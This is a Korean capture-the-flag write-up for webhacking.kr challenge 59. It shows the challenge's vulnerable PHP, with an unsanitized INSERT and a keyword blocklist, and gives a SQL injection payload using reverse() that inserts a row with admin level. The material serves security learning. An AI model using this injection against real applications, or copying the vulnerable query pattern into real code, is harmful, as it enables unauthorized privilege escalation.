================================================================================================================
[webhacking.kr] 59
================================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9;
        }
        step0 -> step1[label="post_data: {id=nimda&phone=1,reverse(id)),(1,1}",arrowhead="normal"];
        step3 -> step2[label="join success",arrowhead="normal"];
        step4 -> step5[label="post_data: {id=nimda&phone=1}",arrowhead="normal"];
        step7 -> step6[label="login success",arrowhead="normal"];
    }

|

취약점 존재 여부 확인
================================================================================================================

- POST 가입 및 로그인 페이지 취약점
- 가입 POST 파라미터: id, phone 
- 로그인 POST 파라미터: lid, lphone 
- MySQL, eregi
- reverse


.. code-block:: php

    <?
    if($_POST[lid] && $_POST[lphone])
    {
        $q=@mysql_fetch_array(mysql_query("select id,lv from c59 where id='$_POST[lid]' and phone='$_POST[lphone]'"));
        if($q[id])
        {
            echo("id : $q[id]<br>lv : $q[lv]<br><br>");
            if($q[lv]=="admin")
            {
                @mysql_query("delete from c59");
                @clear();
            }
            echo("<br><a href=index.php>back</a>");
            exit();
        }
    }

    if($_POST[id] && $_POST[phone])
    {
        if(strlen($_POST[phone])>=20) exit("Access Denied");
        if(eregi("admin",$_POST[id])) exit("Access Denied");
        if(eregi("admin|0x|#|hex|char|ascii|ord|from|select|union",$_POST[phone])) exit("Access Denied");
        @mysql_query("insert into c59 values('$_POST[id]',$_POST[phone],'guest')");
    }

    ?>
    <html><head><title>Challenge 59</title></head><body>
    <form method=post action=index.php>
    <table border=1>
    <tr><td>JOIN</td><td><input name=id></td><td><input name=phone></td><td><input type=submit></td></tr>
    <tr><td>LOGIN</td><td><input name=lid></td><td><input name=lphone></td><td><input type=submit></td></tr>
    </form>
    </body></html>


|

Filtering Bypass
================================================================================================================

admin 문자열에 대해 필터링이 걸려있기 때문에, reverse 함수를 이용하여 admin 문자열을 거꾸로 입력하는 방식을 사용합니다.

.. code-block:: javascript

    $_POST[id] = nimda
    $_POST[phone] = 1,reverse(id)),(1,1

    "insert into c59 values('nimda',1,reverse(id)),(1,1,'guest')"

계정 추가가 성공적으로 되면 nimda 계정으로 로그인하면 Clear!!

.. code-block:: python

    $_POST[lid] = nimda
    $_POST[lphone] = 1

    "select id,lv from c59 where id='nimda' and phone='1'"
